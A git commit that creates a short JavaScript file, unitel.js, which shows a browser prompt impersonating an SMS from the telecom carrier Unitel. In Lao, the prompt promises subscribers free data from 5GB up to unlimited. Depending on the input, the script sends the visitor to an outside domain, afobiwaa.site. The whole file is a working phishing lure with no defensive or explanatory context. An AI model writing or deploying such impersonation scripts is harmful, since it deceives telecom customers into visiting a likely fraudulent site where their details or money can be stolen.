368eb8c65040e229992026226adcb4db501ffc2c
usorondo83 <airboat_mimes_2h@icloud.com>
2026-07-07 04:37:32 +0100

    Create unitel.js

---
+++ unitel.js
@@ -0,0 +1,5 @@
+var password = 'ຂໍ້ມູນຟຣີ'
+password=prompt('Unitel SMS: ລູກຄ້າທີ່ຮັກແພງ, ກະລຸນາຮັບຂໍ້ມູນອິນເຕີເນັດຟຣີຕັ້ງແຕ່ 5GB ຈົນເຖິງບໍ່ຈຳກັດ ສຳລັບການສະໝັກໃຊ້ມາດົນແລ້ວ, ກົດ Free Data ເພື່ອກວດສອບດຽວນີ້. ','ຂໍ້ມູນຟຣີ');
+if (password != 'ຂໍ້ມູນຟຣີ') {
+location.href='https://www.afobiwaa.site/unitelsubscribers';
+}
